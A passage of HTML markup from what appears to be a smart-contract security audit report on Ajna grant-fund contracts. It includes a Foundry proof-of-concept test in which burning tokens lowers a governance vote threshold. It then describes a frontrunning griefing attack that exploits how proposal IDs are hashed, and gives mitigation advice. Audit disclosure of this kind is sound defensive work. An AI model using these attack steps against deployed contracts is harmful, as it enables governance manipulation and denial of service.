class=\"mtk1\">        uint256 votesReceived          = uint256(_extraordinaryFundingProposals[proposalId_].votesReceived);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint256 minThresholdPercentage = _getMinimumThresholdPercentage();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        console.log(&quot;tokensNeeded&quot;, tokensRequested_ + _getSliceOfNonTreasury(minThresholdPercentage));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        return            </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            // 50k            30k                // 50k</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            (votesReceived &gt;= tokensRequested_ + _getSliceOfNonTreasury(minThresholdPercentage))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            // succeeded if tokens requested are available for claiming from the treasury</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            (tokensRequested_ &lt;= _getSliceOfTreasury(Maths.WAD - minThresholdPercentage))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"63\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testManipulateSupply</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// 14 tokenholders self delegate their tokens to enable voting on the proposals</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_selfDelegateVoters</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_votersArr</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">roll</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_startBlock</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">100</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// set proposal params</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">endBlockParam</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">100_000</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// generate proposal targets</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">targets</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">address</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">targets</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// generate proposal values</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">values</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">values</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// generate proposal calldata</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldatas</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">bytes</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">calldatas</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodeWithSignature</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk8\">&quot;transfer(address,uint256)&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_tokenHolder1</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">50_000_001</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// create and submit proposal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">TestProposalExtraordinary</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">testProposal</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_createProposalExtraordinary</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_tokenHolder1</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">endBlockParam</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">targets</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">values</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">calldatas</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk8\">&quot;Extraordinary Proposal for Ajna token transfer to tester address&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">roll</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_startBlock</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">150</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votingWeight</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getVotesExtraordinary</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenHolder2</span><span class=\"mtk1\">, </span><span class=\"mtk12\">testProposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">changePrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenHolder2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">voteExtraordinary</span><span class=\"mtk1\">(</span><span class=\"mtk12\">testProposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalSupply</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bob</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">makeAddr</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;bob&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">changePrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenDeployer</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bob</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenDeployer</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">changePrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bob</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">burn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bob</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">roll</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_startBlock</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">217_000</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">state</span><span class=\"mtk1\">(</span><span class=\"mtk12\">testProposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>Running the test with Bob burning tokens</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"64\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalSupply</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bob</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">makeAddr</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;bob&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">changePrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenDeployer</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bob</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenDeployer</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">changePrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bob</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">burn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bob</span><span class=\"mtk1\">));</span></span></span></code></pre>\n<p>Yields the following result:</p>\n<p><img src=\"https://i.imgur.com/NdNBqMs.png\"></p>\n<p>Whereas if we remove the burning, the tokens needed are increased</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"65\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint256 totalSupply = _token.totalSupply();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        address bob = makeAddr(&quot;bob&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        changePrank(_tokenDeployer);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        _token.transfer(bob, _token.balanceOf(_tokenDeployer));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        changePrank(bob);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        _token.burn(_token.balanceOf(bob));</span></span></span></code></pre>\n<p><img src=\"https://i.imgur.com/LMIoxYs.png\"></p>\n<h3 id=\"recommended-mitigation-steps-18\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-18\" aria-label=\"recommended mitigation steps 18 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>To mitigate this vulnerability, consider implementing a mechanism that uses a snapshot of the total supply at the time of proposal submission rather than the current total supply. This change will prevent the threshold from being manipulated by burning tokens.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/285#issuecomment-1555163118\">MikeHathaway (Ajna) acknowledged</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/285#issuecomment-1568942705\">Picodes (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>Considering that:</p>\n<ul>\n<li>it is within the design of the grant system that the threshold is computed at the end of the voting period to account for potential parallel proposals and changes in the external supply</li>\n<li>however, this finding shows how large holders could significantly increase their voting power to pass an extraordinary proposal and to a significant extent manipulate the vote</li>\n</ul>\n<p>I think this report and its duplicate qualify for Medium severity under “hypothetical attack path with stated assumptions, but external requirements”</p>\n</blockquote>\n<hr>\n<h2 id=\"m-09-adversary-can-prevent-the-creation-of-any-extraordinary-funding-proposal-by-frontrunning-proposeextraordinary\" style=\"position:relative;\"><a href=\"#m-09-adversary-can-prevent-the-creation-of-any-extraordinary-funding-proposal-by-frontrunning-proposeextraordinary\" aria-label=\"m 09 adversary can prevent the creation of any extraordinary funding proposal by frontrunning proposeextraordinary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/260\">[M-09] Adversary can prevent the creation of any extraordinary funding proposal by frontrunning <code>proposeExtraordinary()</code></a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/260\">juancito</a>, also found by <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/447\">Haipls</a></em></p>\n<p>A griefing attack can be conducted to prevent the creation of any extraordinary funding proposal, or targetting specific receivers.</p>\n<p>The cost of performing the attack is low, only involving the gas payment for the transaction.</p>\n<h3 id=\"proof-of-concept-18\" style=\"position:relative;\"><a href=\"#proof-of-concept-18\" aria-label=\"proof of concept 18 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><code>ExtraordinaryFunding::proposeExtraordinary()</code> hashes all its inputs except for <code>endBlock_</code> when creating the <code>proposalId</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"66\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">proposeExtraordinary</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">endBlock_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">targets_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">values_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldatas_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">description_</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_hashProposal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">targets_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">values_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">calldatas_</span><span class=\"mtk1\">, </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">DESCRIPTION_PREFIX_HASH_EXTRAORDINARY</span><span class=\"mtk1\">, </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk11\">bytes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">description_</span><span class=\"mtk1\">)))));</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L85-L92\">Link to code</a></p>\n<p>This allows an adversary to frontrun the transaction, and create an exact proposal, but with an <code>endBlock</code> that will the proposal expire instantly, in a past block or whenever they want.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"67\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ExtraordinaryFundingProposal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newProposal</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_extraordinaryFundingProposals</span><span class=\"mtk1\">[</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">newProposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">endBlock</span><span class=\"mtk1\">        = </span><span class=\"mtk12\">SafeCast</span><span class=\"mtk1\">.</span><span class=\"mtk11\">toUint128</span><span class=\"mtk1\">(</span><span class=\"mtk12\">endBlock_</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L94\">Link to code</a></p>\n<p>Nobody will be able to vote via <code>ExtraordinaryFunding::voteExtraordinary</code>, as the transaction will revert because of <code>proposal.endBlock &#x3C; block.number</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"68\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">startBlock</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">endBlock</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">executed</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ExtraordinaryFundingProposalInactive</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L139-L141\">Link to code</a></p>\n<p>With no votes, the proposal can’t be executed.</p>\n<h3 id=\"coded-proof-of-concept\" style=\"position:relative;\"><a href=\"#coded-proof-of-concept\" aria-label=\"coded proof of concept permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" 